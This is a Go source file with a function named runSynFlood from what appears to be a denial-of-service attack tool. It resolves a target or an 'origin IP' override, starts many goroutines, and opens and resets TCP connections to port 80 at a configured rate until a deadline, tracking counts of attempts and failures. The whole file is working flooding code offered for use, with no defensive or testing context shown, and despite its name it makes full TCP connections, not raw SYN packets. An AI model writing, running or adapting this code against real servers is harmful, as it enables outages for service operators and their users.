package main

import (
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"
)

func runSynFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host := cfg.Target
	port := 80
	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	addrs, err := net.LookupHost(host)
	if err != nil || len(addrs) == 0 {
		log.Printf("SYN flood: cannot resolve %s: %v", host, err)
		return
	}
	targetIP := addrs[0]

	var wg sync.WaitGroup
	perThreadRPS := max(1, cfg.RPS/cfg.Threads)

	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("SYN worker %d recovered: %v", id, r)
				}
			}()

			rate := time.NewTicker(time.Second / time.Duration(perThreadRPS))
			defer rate.Stop()

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				<-rate.C

				atomic.AddInt64(&metrics.TotalRequests, 1)

				conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, port), 2*time.Second)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					continue
				}

				atomic.AddInt64(&metrics.Completed, 1)

				if conn != nil {
					if tcpConn, ok := conn.(*net.TCPConn); ok {
						tcpConn.SetLinger(0)
					}
					conn.Close()
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}
